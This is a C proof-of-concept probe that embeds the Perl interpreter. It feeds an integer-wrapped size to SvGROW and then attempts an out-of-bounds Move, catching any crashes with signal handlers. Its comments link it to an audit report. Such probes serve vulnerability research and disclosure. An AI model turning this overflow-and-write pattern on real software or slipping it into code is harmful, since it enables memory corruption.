#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <setjmp.h>
#include "EXTERN.h"
#include "perl.h"

static jmp_buf jb;
static volatile int caught = 0;
static void handler(int sig) { caught = sig; longjmp(jb, sig); }

static void say(const char *s) { write(2, s, strlen(s)); }

int main(int argc, char **argv, char **env) {
    PerlInterpreter *my_perl = perl_alloc();
    perl_construct(my_perl);
    perl_parse(my_perl, NULL, argc, argv, (char**)NULL);
    perl_run(my_perl);

    SV *sv = newSVpv("AAA", 3);
    STRLEN len;
    char *base = SvPV(sv, len);

    char *t = base;
    char *s = base + 1;
    char *e = base + 2;
    STRLEN e_offset = (STRLEN)(e - base);
    STRLEN grow = (STRLEN)-1;                  /* huge: makes expression wrap */
    STRLEN wrapped = e_offset + grow + 1;      /* == 2 (wrapped, small) */
    STRLEN span = (STRLEN)(e - s);             /* 1 */

    char buf[256];
    snprintf(buf, sizeof buf, "base=%p e_offset=%lu grow=%lu wrapped_alloc=%lu span=%lu\n",
             (void*)base, (unsigned long)e_offset, (unsigned long)grow,
             (unsigned long)wrapped, (unsigned long)span);
    say(buf);

    signal(SIGSEGV, handler);
    signal(SIGBUS, handler);

    say("step 1: SvGROW(sv, wrapped) ...\n");
    if (setjmp(jb) == 0) {
        SvGROW(sv, wrapped);
        snprintf(buf, sizeof buf, "  SvGROW returned; SvLEN=%lu\n", (unsigned long)SvLEN(sv));
        say(buf);
    } else {
        snprintf(buf, sizeof buf, "  SvGROW crashed (signal %d)\n", caught);
        say(buf);
        caught = 0;
    }

    say("step 2: Move(s, s+grow, span, char) ...\n");
    if (setjmp(jb) == 0) {
        Move(s, s + grow, span, char);
        /* NOTE: see audit report — SvGROW did not reject the wrapped size, and this
           Move did not crash on the tested build (layout-dependent). The probe
           demonstrates SvGROW does not detect overflow; it does not reliably
           demonstrate the OOB write. */
        say("  Move returned without crash (layout-dependent; see README/audit notes)\n");
    } else {
        snprintf(buf, sizeof buf, "  Move crashed (signal %d) -> OOB write demonstrated\n", caught);
        say(buf);
    }

    perl_destruct(my_perl);
    perl_free(my_perl);
    return 0;
}
